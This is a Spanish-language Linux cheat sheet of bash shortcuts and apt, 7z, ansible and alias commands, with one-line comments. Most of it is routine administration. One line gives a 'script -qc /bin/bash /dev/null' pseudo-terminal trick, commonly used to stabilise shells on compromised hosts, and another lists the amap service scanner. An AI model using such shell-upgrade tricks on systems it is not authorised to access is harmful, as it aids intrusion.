#################################################################
#                             LINUX                             #
#################################################################

!!    # Repetir último comando
!$    # Último argumento del comando anterior
!*    # Todos los argumentos del comando anterior
!comando    # Ejecutar último comando que empiece con 'comando'
!n    # Ejecutar comando número n del historial
Alt-#    # Comentar línea actual
$(comando)    # Sustitución de comando (moderna)
(comando1; comando2)    # Ejecutar en subshell
Alt-*    # Insertar todas las completaciones
. archivo    # Equivalente a source
./configure    # Configurar compilación
./configure --prefix=/usr/local    # Configurar con prefijo
./script.sh    # Ejecutar script con shebang
Alt-.    # Insertar último argumento del comando anterior
/usr/bin/script -qc /bin/bash /dev/null    # Otra forma de PTY
> archivo.txt    # Vaciar archivo (truncar)
Alt-?    # Listar completaciones posibles
Ctrl-[    # Escape
Ctrl-\\    # Enviar SIGQUIT (dump core)
Ctrl-] x    # Mover cursor al siguiente 'x'
^error^correcto    # Reemplazar en último comando y ejecutar
`comando`    # Sustitución de comando (antigua)
{ comando1; comando2; }    # Ejecutar en shell actual
7z a -p archivo.7z archivos    # Crear 7z encriptado
7z a archivo.7z archivos    # Crear 7z
7z l archivo.7z    # Listar 7z
7z x archivo.7z    # Extraer 7z
add-apt-repository ppa:user/ppa    # Añadir PPA
addr2line -e binario dirección    # Convertir dirección a línea de código
alias    # Listar alias definidos
alias ll='ls -l'    # Crear alias
amap host puerto    # Identificar servicios
ansible host -a "comando"    # Ejecutar comando con Ansible
ansible host -m ping    # Ping a host con Ansible
ansible-playbook playbook.yml    # Ejecutar playbook
ansible-vault create secrets.yml    # Crear vault
ansible-vault edit secrets.yml    # Editar vault
aplay archivo.wav    # Reproducir audio
apt autoremove    # Eliminar dependencias huérfanas
apt full-upgrade    # Actualización completa
apt install paquete    # Instalar paquete
apt list --installed    # Listar instalados
apt purge paquete    # Eliminar paquete y configuración
apt remove paquete    # Eliminar paquete
apt search palabra    # Buscar paquete
apt show paquete    # Mostrar información
apt update    # Actualizar lista de paquetes
apt upgrade    # Actualizar paquetes instalados
apt-cache policy paquete    # Ver política de versiones
apt-cache search palabra    # Buscar en caché
apt-cache show paquete    # Mostrar detalles
apt-file search archivo    # Buscar paquete que provee archivo
apt-file update    # Actualizar base de apt-file
apt-get dist-upgrade    # Actualización de distribución
apt-get install paquete    # Instalar (legacy)
apt-get update    # Actualizar lista (legacy)
apt-mark hold paquete    # Retener paquete
